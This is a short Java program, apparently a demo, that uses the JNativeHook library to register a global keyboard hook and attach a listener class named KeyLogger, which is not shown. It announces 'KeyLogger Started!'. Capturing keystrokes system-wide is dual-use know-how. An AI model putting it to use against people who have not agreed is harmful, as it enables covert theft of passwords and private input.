import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;


public class Demo {

	public static void main(String[] args) {
		try{
			GlobalScreen.registerNativeHook();
			GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
			System.out.println("KeyLogger Started!");
		}catch(NativeHookException e){
			e.printStackTrace();
		}
	}

}